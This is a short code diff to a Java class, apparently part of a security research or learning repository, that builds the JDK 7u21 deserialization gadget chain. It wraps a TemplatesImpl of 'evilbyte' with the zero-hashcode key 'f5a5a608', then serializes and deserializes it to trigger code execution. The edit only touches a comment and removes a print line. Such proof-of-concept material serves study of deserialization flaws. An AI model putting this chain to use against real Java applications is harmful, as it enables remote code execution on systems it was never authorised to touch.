@@ -21,7 +21,7 @@ public class JDK7u21 {
         TemplatesImpl templates = template(evilbyte);
         String zeroHashCodeStr = "f5a5a608";
 
-        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value随便设置一个值。
+        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value随便设置一个值
         HashMap map = new HashMap();
         map.put(zeroHashCodeStr, "any");
 
@@ -46,8 +46,7 @@ public class JDK7u21 {
         map.put(zeroHashCodeStr, templates);
 
         byte[] barr = serial(set);
-
-        System.out.println(barr);
+        
         ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
         ois.readObject();
     }
